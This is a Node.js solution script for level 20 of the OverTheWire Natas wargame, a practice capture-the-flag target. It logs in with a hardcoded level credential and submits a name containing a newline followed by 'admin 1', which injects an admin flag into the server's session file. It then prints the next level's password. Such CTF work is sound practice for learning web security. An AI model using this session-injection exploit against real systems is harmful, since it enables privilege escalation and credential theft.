const http = require('http');
const querystring = require('querystring');

const submit = name =>
  new Promise((resolve, reject) => {
    const request = http.request(
      {
        auth: 'natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          Cookie: `PHPSESSID=abc123`,
        },
        hostname: 'natas20.natas.labs.overthewire.org',
        method: 'POST',
        path: '/index.php?debug=1',
        port: 80,
      },
      res => {
        let body = '';
        res.on('data', data => (body = body + data));
        res.on('end', () => {
          const isAdminSession = !!body.match(/Password/);

          if (isAdminSession) {
            const regex = /\n(Password: [a-zA-Z0-9]{32})<\/pre>/;
            const password = body.match(regex)[1];

            console.log(password);
          }

          resolve(!!body.match(/Password/));
        });
      },
    );

    request.on('error', e => console.log(e));
    request.write(querystring.stringify({name}));
    request.end();
  });

/* Can only consistently get the password if submitting three times
 * Something to do with the session file getting deleted
 */
submit(null);
submit('nick\nadmin 1');
submit(null);
